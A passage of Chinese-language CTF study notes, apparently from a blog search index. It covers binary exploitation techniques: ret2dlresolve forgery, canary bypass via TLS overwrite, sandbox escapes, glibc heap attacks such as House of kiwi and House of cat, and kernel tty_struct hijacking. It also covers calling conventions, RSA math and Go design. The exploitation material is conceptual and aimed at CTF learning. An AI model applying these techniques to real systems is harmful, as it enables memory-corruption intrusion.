这个是个指针 然后解引 就获取了名字的下标 然后通过dynstr[st_nameh]获取函数的名字\",\"那么我们如果可以伪造reloc_arg 然后让rel_plt表索引到bss段 我们可控区域 这样就可以伪造elf_rel的信息 从而伪造r_info的信息 让这个指针指向我们想要调用的函数 然后dynstr就可以直接调用我们的函数了\"]},\"177\":{\"h\":\"c - main函数参数含义\",\"t\":[\"第一个参数argc 也就是传给程序的参数个数 包含了程序文件自己本身的名字 比如./new.exe a b 那么参数就是三个\",\"argv 字符串数组指针 包含程序名称\",\"envp 环境变量字符串数组的指针\"]},\"178\":{\"h\":\"canary 多线程绕过\",\"t\":[\"参考文章:(´∇｀) 欢迎回来！ (cnblogs.com)\",\"在创建新线程的时候 在为栈分配内存后，glibc在内存的高地址初始化TLS，在x86-64架构上，栈向下增长，将TLS放在栈顶部。 从TLS中减去一个特定的常量值，我们得到被新线程的stack register所使用的值。从TLS到pthread_create的函数参数传递栈帧的距离小于一页。 现在攻击者将不需要得到leak canary的值，而是直接栈溢出足够多的数据来复写TLS中的tcbhead_t.stack_guard的值，从而bypass canary。简单来说就是因此会顺便创建一个TLS，而且这个TLS会存储Canary的值，而TLS会保存在stack高地址的地方\"]},\"179\":{\"h\":\"格式化字符串\",\"t\":[\"%*25$d从栈中取变量作为N，比如：栈25$处的值是0x100，那么这个格式化字符串就相当于%256d。（sample：pwn4-MidnightsunCTF-2020）\"]},\"180\":{\"h\":\"ORW沙箱绕过总结\",\"t\":[\"[Pwn - Shellcode Summary | HeyGap's_Blog](https://heygap.github.io/2024/02/08/Pwn - Shellcode Summary/#1-1-shellcode-板子)\",\"[沙箱绕过 | Brvc3's Base](https://brvc3.github.io/2021/05/03/沙箱绕过/#:~:text=绕过方式 禁用了execve或者system 通过 open read write 来读取flag example：,lgd 禁用了 open，write，read openat，所以直接 调用openat，然后除了 read，write，其实还有两个readv，和writev，这些就能绕过限制读取flag%2C有些连openat都禁用的可以 ptrace 修改syscall)\"]},\"181\":{\"h\":\"Seccomp BPF\",\"t\":[\"linux2.6.23内核用ptctl来代替/proc/PID/seccomp进行添加禁用 2012后linux 3.5 增加了新的模式 过滤模式 我们可以允许系统调用\",\"2014年，Linux 3.17 引入了seccomp()系统调用，seccomp()在prctl()的基础上提供了现有功能的超集\",\"BPF就是在内核层起了一层虚拟机 这个虚拟机 起到了过滤作用 这样每次系统调用就会经过该过滤器 此过程不可逆\",\"然后prctl中第二个参数代表操作的对象 如果这个参数为1 则对所有的用户都起作用 会让子进程都受到这个过滤器的限制\",\"ptctl还可以让内核进入严格模式 进程可用的系统调用就只有4个 read(), write(), _exit(), 和 sigreturn()\",\"docker也运用了这项技术 实现了沙盒禁止\"]},\"182\":{\"h\":\"常规绕过\",\"t\":[\"在禁用了大量函数的情况下 我们可以选择一些思路来进行绕过\",\"切换为32位 错开禁用号 进行调用 修改cs寄存器的值 我们一般采用refq 0x23就是32位运行模式 0x33就是64位运行模式\",\"fork一个新的线程 pipe + fork + exec: 创建一个管道\",\"侧信道攻击（无write）\",\"socket通讯 套接字函数来实现 当然前提是别是禁用所有用户\",\"字节不够情况下\",\"观察堆栈 用pop push等栈传递 因为字节很小 一些长的寄存器可以改为短的寄存器\"]},\"183\":{\"h\":\"io_uring利用\",\"t\":[\"io_uring - guanyubo - 博客园 (cnblogs.com)\",\"io_uring主要是两个环形缓冲区构成 sq 和cq 也就是submit queue 和completion queue 都是处于内核空间的 但是用户可以直接访问内核\",\"sq也就是存放用户提交的io请求\",\"cq也就是处理完的sq中的io请求就会填充到cq中 并且通知用户空间i请求完成\",\"流程\",\"io_uring_setup() 系统调用创建 io_uring 实例\",\"提交请求:也就是将io写入sq \",\"io_uring_enter() 提交io事件并且等待其完成 int io_uring_enter(int fd, unsigned to_submit, unsigned min_complete, unsigned flags, sigset_t *sig); fd也就是io_uring_setup的返回值 to_submit也就是要提交的事件数量 min_complete也就是函数返回之前要完成的事件最小数量 sig也就是信号集的指针 用于io完成的时候接受信号 返回值是完成的事件数量\",\"**io_uring_register()**用于注册内核用户共享缓冲区，如文件描述符、缓冲区等。 成功返回0\",\"**io_uring_unregister()**用于取消之前通过 io_uring_register() 注册的资源。\",\"首先使用 io_uring_prep_*() 函数准备 I/O 操作，然后使用 io_uring_submit() 提交这些操作到 io_uring 中进行处理。 \",\"io_uring_prep_readv()：准备读取操作。\",\"io_uring_prep_writev()：准备写入操作。\",\"io_uring_prep_poll_add()：注册一个轮询事件。\",\"内核处理 内核会定期检查sq如果有新的请求就并行处理 也就是同时干\",\"完成通知 当将内容填充进入cq 然后通知用户\",\"用户顶级检查cq发现请求完成后 从cq中取出结果进行后续处理\",\"优点\",\"异步性\",\"非堵塞性\",\"批量处理\",\"灵活性\"]},\"184\":{\"h\":\"refq和retf详解\",\"t\":[\"参考文章:汇编语言 Ret和retf指令_汇编ret和retf-CSDN博客\",\"从汇编角度看retn和retf-百度开发者中心 (baidu.com)\",\"retn (return near) 用栈中数据修改ip寄存器\",\"retf (return far)用栈中数据修改cs:ip寄存器\",\"retfq 和retf一样但是retfq是从64位转化到32位 retf是从32位转到64位\",\"先弹出栈顶给ip然后弹出给cs寄存器 0x33(64位) 0x22(32位)\"]},\"185\":{\"h\":\"为什么用rax间接传参\",\"t\":[\"比如我们没办法直接将一个较大的立即数通过push等直接推入栈 我们需要先赋值给rax 然后推入rax\"]},\"186\":{\"h\":\"arm架构函数调用规范 armv7和armv8的区别\",\"t\":[\"ARMv7和ARMv8架构比较-CSDN博客\",\"[原创] CTF 中 ARM & AArch64 架构下的 Pwn-Pwn-看雪-安全社区|安全招聘|kanxue.com\",\"[ARM pwn 环境搭建+基础入门 | Pwn进你的心 (ywhkkx.github.io)](https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/)\",\"armv7主要是32位指令集 armv8是64位指令集合\"]},\"187\":{\"h\":\"armv7\",\"t\":[\"32位 是利用的r寄存器 一共16个 然后R0-3一啊不能用作函数的参数传递和返回值使用 也可以在程序中保存立即数\",\"r7存储系统调用号\",\"r12 也就是ip r11作为栈指针用作栈底可用于栈回溯 r13sp栈指针 r14 lr链接寄存器 r15 pc 程序计数器\",\"r0存储float返回值 r0-r1存储double\",\"前四个参数都是r0-r3寄存器传递 然后后面通过栈传递\",\"在进行bl等指令的时候 pc存入lr 然后更新pc 就可以通过lr寄存器进行恢复\",\"返回值会被优化 也就是当返回值是一个结构体的时候那么r0就不是第一个参数而是返回值的指针\",\"返回是通过pop {pc}进行的返回\",\"函数调用规范\",\"也就是先保存栈底和下一个指令地址\",\"然后r11设置为栈顶 然后sp展开 这里和x86不同的是arm架构是先进行栈帧展开 再进行的函数跳转\",\"push {r11, lr} /* 序幕的开始,将帧指针和LR保存到堆栈 */ add r11, sp, #0 /* 设置栈底帧 */ sub sp, sp, #16 /* 序幕结束,在堆栈上分配一些缓冲区(这也为堆栈帧分配空间) */ \",\"然后就是寄存器赋值\",\"mov r0, #1 /* 设置局部变量 (a=1)。 这也用作设置函数 max */ 的第一个参数 mov r1, #2 /* 设置局部变量 (b=2)。 这也用作设置函数 max */ 的第二个参数 bl max /* 调用/分支到函数 max */ \",\"返回的时候 也就是将sp变回栈底 然后将栈底和pc返回原本的值\",\"sub sp, r11, #0 /* 结尾的开始,重新调整堆栈指针 */ pop {r11, pc} \",\"arm中ldr是load register str也就是store register\",\"load register 也就是将指针的值存入寄存器中\",\"store register 也就是将寄存器的值存入指针中\",\"arm中str r2 ,[r1 ,#2]也就是存入r+2的位置 但是r1的值不改变\",\"str r2,[r1,#2]!也就是r1的值会发生改变 也就是将最后的地址写入原寄存器中 所以就是+4 !的意思是请求回写\",\"ldr r2,[r1],#-2 也就是r1直接赋值给r2 然后r1减去2\"]},\"188\":{\"h\":\"armv8\",\"t\":[\"arm64架构大差不差 也就是把lr和栈底压入栈 然后栈减去\",\"寄存器名字叫做X了 X0-x7用作参数传递 X0用作函数返回值 x8用作调用号 x32是pc寄存器 x30也就是函数返回值 然后函数调用的时候直接将原本的sp压栈 然后sp减去一定值 最后再回来\",\"BR指令 BLR指令\"]},\"189\":{\"h\":\"mips架构的函数调用规范\",\"t\":[\"mips是存在叶子函数的 叶子函数也就是函数中不会去调用其他任何函数 非叶子函数就是还会调用其他的函数\",\"a调用b的情况 非叶子函数 会将返回地址存入栈中 \",\"叶子函数的话 则返回a的i地址存储再ra寄存器中\",\"当函数返回的时候 如果是非叶子函数 则从堆栈中取出返回地址 然后存入ra寄存器 然后再跳转返回 \",\"叶子函数则直接ra进行跳转\",\"返回值存储再v0-v1中\",\"[mips pwn | p1Kk's World!](https://p1kk.github.io/2020/01/01/异构pwn/mips pwn/#缓冲区溢出分析示例)\",\"调用者把参数都保存在a0-a3寄存器 也就是前4个用寄存器保存后面用栈保存\",\"返回地址存储再ra寄存器上\"]},\"190\":{\"h\":\"phpPwn堆管理机制\",\"t\":[\"[第5章 内存管理 - 5.1 Zend内存池 - 《试读] PHP7内核剖析》 - 书栈网 · BookStack\",\"php中针对内存的操作进行了一层封装 用于替换内存操作 实现malloc free等操作 也就是参考了tcmalloc函数\",\"php内存管理中有三种颗粒度的内存块 也就是chunk page slot 每个chunk占2m 然后page占比4kb 一个chunk会被分配为page 然后page再分配为slot\",\"也就是申请大于2m则申请chunk 大于3/4page就申请page 然后小于3/4page 就申请slot\",\"Huge(chunk): 申请内存大于2M，直接调用系统分配，分配若干个chunk\",\"Large(page): 申请内存大于3092B(3/4 page_size)，小于2044KB(511 page_size)，分配若干个page\",\"Small(slot): 申请内存小于等于3092B(3/4 page_size)，内存池提前定义好了30种同等大小的内存(8,16,24,32，…3072)，他们分配在不同的page上(不同大小的内存可能会分配在多个连续的page)，申请内存时直接在对应page上查找可用位置\",\"都是受到heap结构体管理 用于管理上面三种内存的分配 main_chunk属性是chunk链表 free_slot就是一些固定大小的slot链表 类似于lagrebin的管理模式 2024d3中phppwn那题就是通过劫持slot链表来进行任意写\",\"这里利用的是mmap函数进行的申请内存 而非malloc函数的brk等\"]},\"191\":{\"h\":\"cpp堆管理机制（todo）\"},\"192\":{\"h\":\"musl堆管理器\",\"t\":[\"参考文章:musl 知：内存管理_musl-1.1.20-r5-CSDN博客\",\"轻量级的嵌入式开发glibc库\"]},\"193\":{\"h\":\"堆利用\",\"t\":[\"因为太过重要 以及知识点体系过于庞大 所以单独拿出来 house系列主要是这个Glibc堆利用之house of系列总结 - roderick - record and learn! (roderickchan.github.io)文章进行总结得很好 这里大量直接进行copy\",\"然后总结文章:一篇文章彻底讲懂malloc的实现（ptmalloc）_malloc过程-CSDN博客\",\"有一些很容易想要的一些利用方式这里就不单独列出来了 比如修改fd 控制malloc到的数据 主要是总结一些利用难度较高 比较成体系的利用方式\"]},\"194\":{\"h\":\"malloc函数中的一些检查机制\",\"t\":[\"这个主要是写在源码注释中了 翻阅源码即可然后找到一个很好用的网站写了源码中的宏定义heap - 5 - malloc、free函数相关的宏定义 | Kiprey's Blog\"]},\"195\":{\"h\":\"常见利用技巧\",\"t\":[\"overlapping: 这个技巧主要是通过off_by_null漏洞进行控制size位的prev_inused这个位 这个操作十分方便 我可以间接利用然后实现劫持正在使用的合法chunk 然后我们就可以绕过一些题目中的free检查 比如有一些题必须free 表中记录正在使用的chunk才是合法的 无法直接double free 我们可以通过劫持合法chunk轻松实现double free 具体就是让我们要劫持的chunk刚好处于合并区间之间比如:malloc 五个chunkchunk1,chunk2,chunk3,chunk4,chunk5然后chunk1的内容部分构造好fakechunk根据版本的安全检查进行构造 如果版本较高我们需要计算并且构造好size区域 fd 以及bk然后chunk2就为我们要劫持的chunk 我们通过chunk3写入内容覆盖chunk4完成覆写p位并且构造好prev_size让它刚好指向我们的fakechunk然后最后我们free chunk4触发合并机制 让chunk4到fake chunk之间的内容全部进入unsortedbin中 这样我们malloc下来就可以进行劫持了 这个方法较为好用\"]},\"196\":{\"h\":\"House of force(top chunk 利用)\",\"t\":[\"主要是我们能溢出数据到topchunk的size区域 然后malloc的时候malloc一个超大值让它刚好到我们想要控制的地址附近去\",\"范围:2.23——2.29\",\"因为2.29后加入了对size区域的检查 导致我们没办法再通过直接获取任意地址\"]},\"197\":{\"h\":\"largebin attack\",\"t\":[\"主要是利用了unsoretdbin 的入链机制 也就是当我们所需要的chunk不属于fastbin tcachebin 已有chunk大小 需要从unsrotedbin中取chunk的时候 触发unsortedbin分类合并机制 如果unsortedbin中chunk有一个chunk属于largebin的范围 并且比largebin chunk的最小的chunk还小 我们如果可以劫持largebin 最小的那个chunk 就可以触发一个任意写已知地址 并且还可以实现堆地址的泄露 十分好用的技巧\"]},\"198\":{\"h\":\"smallbin attack(todo)\"},\"199\":{\"h\":\"House of kiwi\",\"t\":[\"利用malloc_assert的fflush(stderr);来触发调用链\",\"通过触发assert函数中的fflush 然后调用_io_file_jumps的_io_FILE_SYNC指针 并且rdx恒为_IO_helper_jumps指针\",\"我们可以将_io_file_sync指针调整为setcontext+61触发rdx到寄存器的赋值 然后我们劫持_IO_helper_jumps(0xa0 0xa8)实现 \",\"修改IO_helper_jumps + 0xA0 and 0xA8分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移\"]},\"200\":{\"h\":\"house of cat\",\"t\":[\"可以打fsop 也就是打main函数返回 程序执行exit libc执行abort(高版本已经删除) __malloc_assert则是在malloc中触发，通常是修改top chunk的大小。\",\"触发__malloc_assert调用__fxprintf\",\"主要是想办法调用_IO_xxx_jumps\",\"__malloc_assert (const char *assertion, const char *file, unsigned int line, const char *function) { (void) __fxprintf (NULL, \\\"%s%s%s:%u: %s%sAssertion `%s' failed.\\\\n\\\", __progname, __progname[0] ? \\\": \\\" : \\\"\\\", file, line, function ? function : \\\"\\\", function ? \\\": \\\" : \\\"\\\", assertion); fflush (stderr); abort (); } \",\"然后__fxprintf又调用__vfxprintf函数 然后调用locked_vfxprintf 然后调用__vfwprintf_internal然后调用对应的vtable函数\",\"image-20240602023528121\"]},\"201\":{\"h\":\"printf/puts io调用链(TODO)\"},\"202\":{\"h\":\"linux Kernel\",\"t\":[\"kernel部分比较重要需要重新梳理一下 以及理顺一些脉络\"]},\"203\":{\"h\":\"段保护模式/页保护模式\",\"t\":[\"一般来说我们的逻辑地址会经历转化才回到真正的物理地址去\",\"4.1 为什么要有虚拟内存？ | 小林coding (xiaolincoding.com)\",\"虚拟地址->线性地址->物理地址\",\"32位我们比较熟悉 在复习中断的时候 我们已经大概的复习了一下两级分页机制 然后下面图是大佬博客里面的四级分页机制的图 讲解得很仔细\"]},\"204\":{\"h\":\"虚拟地址转化为线性地址\",\"t\":[\"依赖于段选择子也就是段寄存器 段选择子再去\"]},\"205\":{\"h\":\"实/保护模式\",\"t\":[\"实模式就是简单通过cs:ip这样的方式直接访问内存\",\"保护模式就是通过段机制 来间接访问内存\"]},\"206\":{\"h\":\"进程\",\"t\":[\"5.1 进程、线程基础知识 | 小林coding (xiaolincoding.com)\",\"一般多线程 如果一个线程挂了就会导致全部线程崩溃 因为线程是共享内存的 如果一个线程崩溃了就会导致内存有错误 不确定会带来一些难以想象的后果 所以其他线程也会更随着崩溃\",\"操作系统通过pcb进程控制块来描述进程 pcb通常是相同状态的链表链接在一起的\",\"进程是资源（包括内存、打开的文件等）分配的单位，线程是 CPU 调度的单位；\"]},\"207\":{\"h\":\"execve\",\"t\":[\"是先将程序头写入进入新的内存 然后通过cow进行copy其他代码部分\",\"覆盖原有的进程 会改变代码段\"]},\"208\":{\"h\":\"oom机制\",\"t\":[\"4.3 内存满了，会发生什么？ | 小林coding (xiaolincoding.com)\",\"当进行申请内存 内存不够 并且回收一些内存（kswapd）后依旧不够就会杀死一个物理内存占用较高的进程 直到释放足够的内存位置\",\"回收内存(lru算法): \",\"内存页(大多数内存页都是可以直接释放的 以后有需要了 在进行重新读取即可 如果已经被程序修改过了 并且暂时没有写入磁盘的数据(脏页) 会先写入磁盘 然后再进行内存的释放)\",\"匿名页:比如栈堆等 这些内存随时有可能再次被访问所以不能直接回收所以会利用swap机制先写入磁盘中 然后再释放内存\"]},\"209\":{\"h\":\"如何保护一个进程不被 OOM 杀掉呢？\",\"t\":[\"oom主要是根据进程的得分来进行评估是否要杀掉 \",\"第一，进程已经使用的物理内存页面数。\",\"第二，每个进程的 OOM 校准值 oom_score_adj。它是可以通过 /proc/[pid]/oom_score_adj 来配置的。我们可以在设置 -1000 到 1000 之间的任意一个数值，调整进程被 OOM Kill 的几率。\",\"所以我们可以通过 oom_score_adj来避免被杀 比如把这个值设置位-1000\"]},\"210\":{\"h\":\"linux的内存管理\",\"t\":[\"32位操作系统和64位操作系统在内核内存的分布是不一样的\",\"首先在32位操作系统中内核虚拟内存和进程虚拟内存是无缝衔接的 而64位操作系统内核和用户空间是存在一大块空洞空间的\",\"存在原因是因为64位用高16位作为标记 也就是0x0000 7fff ffff f000以下为用户 0xffff 8000 0000 0000以上是内核\",\"32位是4g 64位是16 EB\",\"32位内核内存分布\",\"最先是896mb（直接映射区域）是和物理内存一一对应的 但是其还是使用的虚拟地址并且也要通过映射转化为物理地址 \",\"其中前16mb是DMA区域 用于存放\",\"剩下就是NORMAL区域\",\"高端内存也就是896mb之上的区域（128mb）采用的是动态映射技术 \",\"vmalloc 区域 也就是使用vmalloc进行申请的区域\",\"永久映射区 也就是允许建立与物理高端内存的长期映射关系 比如内核通过alloc_pages函数申请物理内存页 这些物理内存页通过kmap映射到永久映射区\",\"固定映射区\",\"临时映射区 也就是缓冲区的作用比如做一些copy操作的时候\",\"图片\",\"64位内核内存分布\",\"64位的由于空间巨大 不需要和32位一样精细规划 所以相对而言简单一些\",\"64t的直接映射区\",\"32t的vmalloc区域\",\"1t虚拟内存映射区\",\"512mb代码段\",\"伙伴算法\",\"分配内存页使用alloc_pages来完成 而alloc_pages是通过rmqueue()来分配内存页\"]},\"211\":{\"h\":\"如果4g物理内存的机子上面申请8g内存会怎样\",\"t\":[\"4.4 在 4GB 物理内存的机器上，申请 8G 内存会怎么样？ | 小林coding (xiaolincoding.com)\",\"如果32位操作系统的情况下 我们申请就会失败 因为32位操作系统虚拟内存也就4g\",\"64位操作系统是成功的 因为cow的关系 我们只有真的写的时候才会影响实际的物理内存\"]},\"212\":{\"h\":\"Pwn linux kernel\"},\"213\":{\"h\":\"调试\",\"t\":[\"环境拿下来后可以通过指令直接运行起内核 然后通过调试\",\"qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -monitor /dev/null -m 128M --nographic -s \",\"当题目中不存在vmlinux文件的时候 我们要调试内核或者查看rop链的时候 可以用 extract-vmlinux 命令可以从 bzImage种提取vmlinux\",\"一般情况下我们需要提取出来ko文件 目前linux kernel文件系统 主要分为两种:ext4和cpio 两种我们的提取方式不同\",\"Linux Kernel Pwn 初探 - 先知社区 (aliyun.com)\",\"ext4 直接将文件系统挂载在已有的目录中 \",\"mkdir ./rootfs\",\"sudo mount rootfs.img ./rootfs\",\"此时这个时候这个目录下就已经有了我们的文件目录\",\"cpio 这个稍微多一步也就是 解压文件系统 重打包 \",\"mkdir extracted; cd extracted\",\"cpio -i --no-absolute-filenames -F ../rootfs.cpio\",\"此时与其它文件系统相同，找到rcS文件，查看加载的驱动，拿出来\",\"find . | cpio -o --format=newc > ../rootfs.cpio\"]},\"214\":{\"h\":\"常规保护机制\",\"t\":[\"Linux Kernel Pwn 初探 - 先知社区 (aliyun.com)\",\"KPTI：Kernel PageTable Isolation，内核页表隔离\",\"KASLR：Kernel Address space layout randomization，内核地址空间布局随机化 \",\"也就是kernel的ASLR\",\"SMEP：Supervisor Mode Execution Prevention，管理模式执行保护 \",\"也就是内核状态下不允许执行用户态的代码\",\"SMAP：Supervisor Mode Access Prevention，管理模式访问保护 \",\"也就是内核状态下不允许访问用户态的数据\",\"SMEP与SMAP这两个都是通过cr4寄存器来进行判断开启关闭的 所以我们如果可以修改cr4的值 我们就可以实现绕过这两个保护\",\"Stack Protector：Stack Protector又名canary，stack cookie\",\"kptr_restrict：允许查看内核函数地址\",\"dmesg_restrict：允许查看printk函数输出，用dmesg命令来查看\",\"MMAP_MIN_ADDR：不允许申请NULL地址 mmap(0,....)\"]},\"215\":{\"h\":\"常用利用结构体\",\"t\":[\"tss_struct 中cr3主要是存储页目录的物理地址 cs寄存器末尾存储当前的权限等级\"]},\"216\":{\"h\":\"mm_struct\",\"t\":[\"主要负责对内存区域的大致划分结构体属性存储的就是各个内存区域的边界\",\"图片\"]},\"217\":{\"h\":\"vm_arena_struct结构体(双向链表)\",\"t\":[\"描述一个内存区域的开始结束 权限 是否能共享(mmap)等信息 以及存储了虚表指针(open close 等)\",\"图片\"]},\"218\":{\"h\":\"cred结构体\",\"t\":[\"创建一个新进程的时候 内核会申请一个cred结构体 存放进程信息 主要是一些权限信息之类的\"]},\"219\":{\"h\":\"tty_struct\",\"t\":[\"学习文章:tty_struct数据结构_ttystruct-CSDN博客\",\"linux kernel pwn学习之伪造tty_struct执行任意函数_tty struct-CSDN博客\",\"tty_driver 是驱动通过alloc_tty_driver函数分配的 也就是调用kzalloc tty0也就是控制台的文件体现\",\"tty_driver的flags等在未被赋值的时候所有值都是0\",\"当open(ptmx)的时候会初始化tty_struct\",\"攻击手段就是利用在调用对ptmx驱动进行write操作的时候我们是利用的tty_struct结构体中虚表进行的操作 所以我们如果可以伪造这个vtable然后指向我们的可控区域 来实现函数的调用\"]},\"220\":{\"h\":\"堆喷/脏管道学习(TODO)\"},\"221\":{\"h\":\"V8/jsc(TODO)\"},\"222\":{\"h\":\"标记指针\",\"t\":[\"v8中利用指针标记技术在v8的堆指针中存储额外的数据 比如32位操作系统下最低有效位用来区分smis/堆指针 第二个最低有效位来区分强引用和弱引用 64位操作系统用前32位进行当作负载 \",\"强引用也即是垃圾回收器不会去回收这个对象 内存不足也不会去回收 必须是显式释放\",\"软引用用于描述一些有用但不是必须的对象 内存不足有可能被回收比如java中用new SoftReference来进行引用\",\"弱引用 下次垃圾回收就有可能被回收\"]},\"223\":{\"h\":\"压缩指针\",\"t\":[\"v8 将高32位存储在r13寄存器中\"]},\"224\":{\"h\":\"js对象基础属性\",\"t\":[\"prototype 也就是js对象都是继承自另外个对象 也就是父对象 父对象被称之为原型对象(null除外 它没有自己的原型对象)\",\"所以当调用对象的函数或者属性的时候 如果没有该属性或者方法就会去原型对象上面查找 如果找到不到就一直向上寻找直到最顶层的Object.prototype 如果最自己本身具备就不会去找原型\"]},\"225\":{\"h\":\"编译整体流程(TODO)\"},\"226\":{\"h\":\"如何调试(TODO)\"},\"227\":{\"h\":\"编译原理\",\"t\":[\"编译器主要是四个阶段 \",\"预处理 \",\"比如对宏进行展开\",\"编译 \",\"生成汇编语言 \",\"语法分析(syntax analyzing)\",\"语义分析()\",\"生成中间代码\",\"代码生成\",\"汇编\",\"链接\"]},\"228\":{\"h\":\"语法解析(TODO)\"},\"229\":{\"h\":\"TOken生成(TODO)\",\"t\":[\"ebnf语法\"]},\"230\":{\"h\":\"AST生成(TODO)\"},\"231\":{\"h\":\"字面量语法树\"},\"232\":{\"h\":\"一元运算抽象语法树\"},\"233\":{\"h\":\"二元运算抽象语法树\"},\"234\":{\"h\":\"中间代码生成（TODO）\"},\"235\":{\"h\":\"链接与库（TODO）\"},\"236\":{\"h\":\"ld的链接(TODO)\"},\"237\":{\"h\":\"RSA算法\"},\"238\":{\"h\":\"背景:\",\"t\":[\"RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年首次公布，当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。 RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。 今天只有短的RSA钥匙才可能被强力方式解破。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。但在分布式计算和量子计算机理论日趋成熟的今天，RSA加密安全性受到了挑战。 RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。 RSA算法是现今使用最广泛的公钥密码算法，也是号称地球上最安全的加密算法。在了解RSA算法之前，先熟悉下几个术语 根据密钥的使用方法，可以将密码分为对称密码和公钥密码 🍬对称密码：加密和解密使用同一种密钥的方式 🍬公钥密码：加密和解密使用不同的密码的方式，因此公钥密码通常也称为非对称密码。\"]},\"239\":{\"h\":\"了解知识点\",\"t\":[\"费马小定理\",\"a为整数 p 为质数 那么就满足\",\"image-20240704014527546\",\"当a是p的倍数 所以a的p次方也是p的倍数 所以a就等于0 ----？\",\"如果a不是p的质数的话 则\",\"image-20240704014620377\",\"，欧拉函数，欧拉定理\"]},\"240\":{\"h\":\"计算方式\",\"t\":[\"参考文章:素数（质数）判断的五种方法_判断质数-CSDN博客\",\"质数(prime number)又称素数，有无限个。一个大于1的自然数，除了1和它本身外，不能被其他自然数整除，换句话说就是该数除了1和它本身以外不再有其他的因数;否则称为合数。\",\"欧拉函数：在数论中，对正整数n，欧拉函数φ(n)是小于或等于n的正整数中与n互质的数的数目,此函数以其首名研究者欧拉命名，它又称为φ函数（由高斯所命名）\",\"互质:又称互素在数论中，如果两个或两个以上的整数的最大公约数是1，则称它们为互质。\",\"扩展欧几里得\",\"选择两个大素数p和q典型值为1024位\",\"判断素数\",\"image-20240704014311077\",\"计算n=p*q和z=(p-1)*(q-1)\",\"img\",\"这里的n就代表欧拉函数 也就是phi(n)\",\"找到一个e 也就是1< e < φ(n)，且e与φ(n) 互质。 实际运用中常常选择常常选择 65537\",\"计算e对于φ(n)的模反元素d(逆元)。\",\"所谓\\\"模反元素\\\"就是指有一个整数d，可以使得ed被φ(n)除的余数为1。 ed%φ(n) == 1 也就是:ed ≡ 1 (mod φ(n))\",\"同时也等价为: ed - 1 = kφ(n) 所以找到d本质上是对ex+yφ(n)=1求解(x替换d,y替换k) 这里求解就用\\\"扩展欧几里得算法\\\" 就可以求解到x与y\",\"然后公开密钥为:(e,n),私有密钥为(d,n)\",\"实际应用:\",\"image-20240704024340068\",\"比如加密:ｍe ≡ c (mod n) 公钥: (e n) \",\"所以c = me - kn\",\"然后解密:cd = m (mod n) 私钥:(d,n) \",\"所以c=me-kn带入得到 (me-kn)d = m(mod n) 所以等价为:med = m (mod n)\",\"因为ed = 1(mod phi n)\"]},\"241\":{\"h\":\"安全性\",\"t\":[\"有办法通过公钥 也就是n e推到出d吗 因为私钥就是(d,n)知道了私钥就有办法通过密文解密出原文 上述一共提及了几个字母:p,q,n,phi n,e,d\",\"比如我们推算d的公式:ed=1mod(phi n ) 所以也就是如果知道了e和phi n就可以算出d\",\"phi n = (p-1)(q-1) 所以知道了p和q就知道了phi n\",\"n=pq 也就是能够将n因式分解就可以算出p和q\",\"那么首先就可以很容易想到通过逆推3->2->1 所以我们可以将n因式分解就可以得到pq然后得到phin 我们本来就拥有e所以就可以算出d 但是还记得我们最开始说的吗 rsa的难点就在于大数的因式分解 所以一般不会这样简单\",\"所以我们一般通过额外的一些信息来进行安全攻击\"]},\"242\":{\"h\":\"代码实现\",\"t\":[\"扩展欧几里得算法\",\"因为ed = 1(mod phi n) 所以ed - kphi n = 1 已经知道e和phi 丢入则得到d和k\",\"def ext_gcd(a, b): if b == 0: return 1, 0, a else: x, y, gcd = ext_gcd(b, a % b) x, y = y, (x - (a // b) * y) return x, y, gcd \"]},\"243\":{\"h\":\"CTF中常见题型\",\"t\":[\"rsa中通常还有个签名消息也就是校验码,确定密文是否被修改过\",\"已经知道p,q,e求d\",\"ed=1(mod phi n)所以利用扩展欧几里得算法 函数:gmpy2.invert 按照e phi_n顺序丢入\",\"import gmpy2 def ext_gcd(a, b): if b == 0: return 1, 0, a else: x, y, gcd = ext_gcd(b, a % b) x, y = y, (x - (a // b) * y) return x, y, gcd p = 38456719616722997 q = 44106885765559411 e = 65537 phi_n = (p - 1) * (q - 1) print(ext_gcd(phi_n,e)) d = gmpy2.invert(e,phi_n) print(d) \",\"已经知道n比较小,e求d?\",\"也就是通过n的分解（因式分解工具 (numberempire.com)）\",\"通过分解n得到p,q然后根据e 得到d\",\"已知密文文件 flag.enc / cipher.bin /flag.b64和 公钥文件 pubkey.pem /key.pem /key.pub求解明文 m？\",\"使用RsaCtfTool\",\"已知 c ,e,n非常大 和dp dq求解m\",\"领航杯2019的一道题\"]},\"244\":{\"h\":\"go后台架构设计浅学习\",\"t\":[\"这里主要是列举几个设计模式 然后说一下优缺点以及代码实现演示 以及一些小技巧 和值得注意的一些东西\",\"参考文章:[Go后台项目架构思考与重构 | 深度长文-CSDN博客](https://blog.csdn.net/dqcfkyqdxym3f8rb0/article/details/105780625#:~:text=1 架构的重要性； 2 重构的几种模式； 3 设计原则；,4 DDD 中领域思想； 5 项目的可测试性； 6 项目的可演进性。) 这里强烈直接观看原文 本blog只是对这个文章中的一些专业名词进行一个解释 而且本文可能对原文的理解有偏差而且并没有实际的代码列子来进行辅助理解 所以建议直接食用原文 当然后续会更新\"]},\"245\":{\"h\":\"常见开发遇到的规范问题\",\"t\":[\"个人在开发的时候其实遇到了很多的问题 就是设计框架上面的混乱 本来想着偷偷懒有一些东西都没去多想 想着不会出多大问题 随着代码的累积发现后面程序就积重难返了 这里看见了大佬的文章感觉说得很对(\",\"依赖关系混乱\",\"在开发中经常发生这种情况 就是经常在设计模块的时候只要不发生依赖循环我们就会在A依赖B依赖C 然后保证B和C不去依赖A 但是频繁这样做随意去依赖其他模块会导致模块之间依赖极其混乱 模块之间难以复用 所以我们可以采用外部依赖接口化 